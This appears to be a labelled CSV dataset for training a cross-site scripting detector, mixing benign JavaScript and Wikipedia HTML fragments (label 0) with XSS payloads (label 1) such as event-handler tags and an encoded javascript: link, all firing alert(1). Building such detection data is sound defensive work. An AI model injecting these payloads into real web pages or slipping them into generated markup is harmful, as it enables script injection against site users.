payload,label
<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>,1
<hr onpointerover=alert(1)>xss</hr>,1
"<li id=""cite_note-252""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-252"">^ </a> </b>",0
"<progress onmouseout=""alert(1)"">test</progress>",1
"var handlenumber = false; scope_handles.foreach(function(handle, index){ if ( handle.hasattribute('disabled') ) {",0
"<object onmouseover=""alert(1)"">test</object>",1
} }); var renderresults = function(results) {,0
"throw new typeerror(`${name$a.touppercase()}: option ""reference"" provided type ""object"" without a required ""getboundingclientrect"" method.`); } return config;",0
nextelement.classlist.add(class_name_active),0
"parent.replacechild(wrapper, el); wrapper.appendchild(el); }",0
"<pre onmouseover=""alert(1)"">test</pre>",1
"<header onmousedown=""alert(1)"">test</header>",1
} } definejqueryplugin(popover);,0
"} window.removeeventlistener('resize', this._handlethrottledresizebound); }",0
"<footer onmouseout=""alert(1)"">test</footer>",1
} if (summary === null) { return false;,0
"if (_this53.options.mindate) _this53.options.mindate.sethours(0, 0, 0, 0)",0
"<source onmousedown=""alert(1)"">test</source>",1
"<a href=""&#0000106avascript:alert(1)"">xss</a>",1
"plugin.init(this, arguments[0])",0
if (this.ishovered || this.isfocused) {,0
} addchip(chip) { if (!this._isvalid(chip) || this.chipsdata.length >= this.options.limit) {,0
"<sup onkeyup=""alert(1)"" contenteditable>test</sup>",1
"var x = void 0, y = void 0, delta = void 0,",0
"<ruby onpaste=""alert(1)"" contenteditable>test</ruby>",1
"<h3><span class=""mw-headline"" id=""planning"">planning",0
<frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>,1
"<td draggable=""true"" ondragend=""alert(1)"">test</td>",1
"<footer oncopy=""alert(1)"" contenteditable>test</footer>",1
"} for (const sel of selectorengine.find(selector, this._element)) { callback(sel);",0
"<p><a href=""/wiki/joseph_weizenbaum"" title=""joseph weizenbaum"">joseph weizenbaum </a> wrote that ai applications cannot, by definition, successfully simulate genuine human empathy and that the use of ai technology in fields such as <a href=""/wiki/customer_service"" title=""customer service"">customer service </a> or <a href=""/wiki/psychotherapy"" title=""psychotherapy"">psychotherapy </a><sup id=""cite_ref-380"" class=""reference""><a href=""#cite_note-380"">&#91;369&#93; </a> </sup> was deeply misguided. weizenbaum was also bothered that ai researchers (and some philosophers) were willing to view the human mind as nothing more than a computer program (a position now known as <a href=""/wiki/computationalism"" class=""mw-redirect"" title=""computationalism"">computationalism </a>). to weizenbaum these points suggest that ai research devalues human life.<sup id=""cite_ref-weizenbaum&#39;s_critique_381-0"" class=""reference""><a href=""#cite_note-weizenbaum&#39;s_critique-381"">&#91;370&#93; </a> </sup>",0
"} _removetemporaryeventhandlers() { document.body.removeeventlistener('click', this._handledocumentclickbound, true);",0
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",1
this.isopen = false; this.$anchor = this.$el.children('a').first(); this.$menu = this.$el.children('ul').first();,0
value: function _setup() {,0
"<command onmousedown=""alert(1)"">test</command>",1
</span></a></dt><dd>write your first scrapy project.</dd>,0
"key: ""draw"", value: function draw(force) { if (!this.isopen && !force) {",0
<output onpointerenter=alert(1)>xss</output>,1
index_js.definejqueryplugin(offcanvas),0
var $tabswrapper = this._tabscarousel.$el; this._tabscarousel.destroy(); $tabswrapper.after($tabswrapper.children());,0
<footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>,1
"return a.setattribute(c, d)",0
"</span> <span class=""toctext"">computationalism and functionalism",0
return (/date/.test(object.prototype.tostring.call(obj)) && !isnan(obj.gettime()) ); },0
const trigger_hover = 'hover',0
"this.el.removeeventlistener('touchmove', this._handleclosedragbound); this.el.removeeventlistener('touchend', this._handleclosereleasebound); this.el.removeeventlistener('click', this._handleclosetriggerclickbound);",0
"eventhandler.trigger(this._element, event_closed)",0
} _handledragtargetdrag(e) { if (!this.options.draggable || this._iscurrentlyfixed() || this._verticallyscrolling) {,0
<textarea onselect=alert(1) autofocus>xss</textarea>,1
"activeindicator.removeattribute('aria-current'); const newactiveindicator = selectorengine.findone(`[data-bs-slide-to=""${index}""]`, this._indicatorselement); if (newactiveindicator) {",0
<abbr onpointerenter=alert(1)>xss</abbr>,1
"<script onkeyup=""alert(1)"" contenteditable>test</script>",1
"constructor(el, options) { super(parallax, el, options); this.el.m_parallax = this;",0
<input onpointerout=alert(1)>xss</input>,1
return unique(elems),0
"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161118165842/http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">""cto corner: artificial intelligence use in financial services – financial services roundtable"" </a>. <i>financial services roundtable </i>. 2 april 2015. archived from <a rel=""nofollow"" class=""external text"" href=""http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">the original </a> on 18 november 2016<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">18 november",0
"activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname); this._issliding = false; triggerevent(event_slid);",0
this._keysselected[key] = true,0
<abbr onpointerdown=alert(1)>xss</abbr>,1
"}; class materialbox extends component { constructor(el, options) {",0
<meter onpointerenter=alert(1)>xss</meter>,1
<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>,1
"<li><a href=""/wiki/semantics_(computer_science)"" title=""semantics (computer science)"">semantics </a> </li> </ul>",0
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,1
this._settabsandtabwidth(); this._animateindicator(previndex); e.preventdefault();,0
"a.key.tolowercase(), b.key.tolowercase(), val.tolowercase()",0
<colgroup onpointerleave=alert(1)>xss</colgroup>,1
let scrolltop = container.scrolltop; let scrolledx = bounding.left - scrollleft; let scrolledy = bounding.top - scrolltop;,0
_this29.timeremaining -= 20; } if (_this29.timeremaining <= 0) {,0
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",1
"<li id=""cite_note-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;-348""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;_348-0"">^ </a> </b>",0
return element; } return m.getoverflowparent(element.parentelement);,0
"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></td>",1
<animatemotion onpointerdown=alert(1)>xss</animatemotion>,1
"<hr onmouseup=""alert(1)"">test</hr>",1
$this.attr('placeholder') !== null,0
"'clean:temp' ]); grunt.task.registertask('configurebabel', 'configures babel options', function() {",0
<footer id=x tabindex=1 onfocusin=alert(1)></footer>,1
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,1
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,1
const button = event.relatedtarget,0
let heightpercent = this.originalheight / this.windowheight,0
<multicol onpointerdown=alert(1)>xss</multicol>,1
"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>",1
"}; toggle(selector_dropdown_toggle, class_name_active); toggle(selector_dropdown_menu, class_name_show);",0
_configaftermerge(config) { config.toggle = boolean(config.toggle) // coerce string values config.parent = getelement(config.parent),0
"this._menu.classlist.remove(class_name_show); this._element.classlist.remove(class_name_show); this._element.setattribute('aria-expanded', 'false');",0
"x += max(html.clientwidth, body ? body.clientwidth : 0) - width",0
<fieldset onpointerleave=alert(1)>xss</fieldset>,1
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 4.2, </li>",0
"complete: function (anim) { $body.css({ overflow: '',",0
"let top = m.getdocumentscrolltop(),",0
"return domelem.m_scrollspy; } }, {",0
if (this.activeindex >= 0) { this.$active = $(this.container) .children('li'),0
_this31.isdragged = false; _this31.lastwindowwidth = window.innerwidth; _this31.lastwindowheight = window.innerheight;,0
"<hr draggable=""true"" ondragenter=""alert(1)"">test</hr>",1
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",1
<b id=x tabindex=1 onfocusin=alert(1)></b>,1
<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,1
}) const alreadyopen = selectorengine.findone(open_selector) if (alreadyopen && alreadyopen !== target) {,0
"<output ondblclick=""alert(1)"">test</output>",1
<embed onpointerup=alert(1)>xss</embed>,1
"<output draggable=""true"" ondrag=""alert(1)"">test</output>",1
"this._popper = null this._parent = this._element.parentnode // dropdown wrapper this._menu = selectorengine.next(this._element, selector_menu)[0] ||",0
"<span onpaste=""alert(1)"" contenteditable>test</span>",1
<fieldset onpointerover=alert(1)>xss</fieldset>,1
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>",1
"<listing onkeypress=""alert(1)"" contenteditable>test</listing>",1
"} getnextactiveelement(items, target, key === arrow_down_key$1, !items.includes(target)).focus(); }",0
<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>,1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",1
"<style>@keyframes slidein {}</style><* style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></*>",1
this.xnumsteps = [ false ],0
typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('@popperjs/core')) :,0
function s4() { return math.floor((1 + math.random()) * 0x10000).tostring(16).substring(1); },0
<hgroup onpointerdown=alert(1)>xss</hgroup>,1
"<noembed draggable=""true"" ondragend=""alert(1)"">test</noembed>",1
"<p>the field of machine ethics is concerned with giving machines ethical principles, or a procedure for discovering a way to resolve the ethical dilemmas they might encounter, enabling them to function in an ethically responsible manner through their own ethical decision making.<sup id=""cite_ref-autogenerated1_397-0"" class=""reference""><a href=""#cite_note-autogenerated1-397"">&#91;386&#93; </a> </sup> the field was delineated in the aaai fall 2005 symposium on machine ethics: ""past research concerning the relationship between technology and ethics has largely focused on responsible and irresponsible use of technology by human beings, with a few people being interested in how human beings ought to treat machines. in all cases, only human beings have engaged in ethical reasoning. the time has come for adding an ethical dimension to at least some machines. recognition of the ethical ramifications of behavior involving machines, as well as recent and potential developments in machine autonomy, necessitate this. in contrast to computer hacking, software property issues, privacy issues and other topics normally ascribed to computer ethics, machine ethics is concerned with the behavior of machines towards human users and other machines. research in machine ethics is key to alleviating concerns with autonomous systems—it could be argued that the notion of autonomous machines without such a dimension is at the root of all fear concerning machine intelligence. further, investigation of machine ethics could enable the discovery of problems with current ethical theories, advancing our thinking about ethics.""<sup id=""cite_ref-autogenerated2_398-0"" class=""reference""><a href=""#cite_note-autogenerated2-398"">&#91;387&#93; </a> </sup> machine ethics is sometimes referred to as machine morality, computational ethics or computational morality. a variety of perspectives of this nascent field can be found in the collected edition ""machine ethics""<sup id=""cite_ref-autogenerated1_397-1"" class=""reference""><a href=""#cite_note-autogenerated1-397"">&#91;386&#93; </a> </sup> that stems from the aaai fall 2005 symposium on machine ethics.<sup id=""cite_ref-autogenerated2_398-1"" class=""reference""><a href=""#cite_note-autogenerated2-398"">&#91;387&#93; </a> </sup>",0
this._observer.disconnect(),0
"this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound)",0
"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",1
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,1
"this._setattributeifnotexists(target, 'role', 'tabpanel'); if (child.id) { this._setattributeifnotexists(target, 'aria-labelledby', `${child.id}`);",0
<u onpointerover=alert(1)>xss</u>,1
"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>",1
"this.el.addeventlistener('click', this._handlecarouselclickbound)",0
static get defaulttype() { return defaulttype$5; },0
"<li><a href=""/wiki/conventionalism"" title=""conventionalism"">conventionalism </a> </li>",0
<svg><spacer onload=alert(1)></spacer>,1
"<legend onmouseleave=""alert(1)"">test</legend>",1
this.ishovered = false; this.isfocused = false; this._appendtooltipel();,0
"$textarea.css('height', hiddendiv.innerheight() + 'px'); } else if ($textarea[0].value.length < $textarea.data('previous-length')) { $textarea.css('height', $textarea.data('original-height') + 'px');",0
"if (typeof window.ontouchstart !== 'undefined') { this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound);",0
"}, { key: ""_handlerangemousedowntouchstart"", value: function _handlerangemousedowntouchstart(e) {",0
if ( handlenumber === false ) { return false; },0
<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>,1
"document.removeeventlistener('scroll', pushpin._updateelements); } _updateposition() {",0
!$target.parent().hasclass('is-disabled') ) { this.setdate(,0
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 10.3, 17.5 </li> </ul>",0
"return _get(timepicker.__proto__ || object.getprototypeof(timepicker), ""init"", this).call(this, this, els, options)",0
"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menuitem>",1
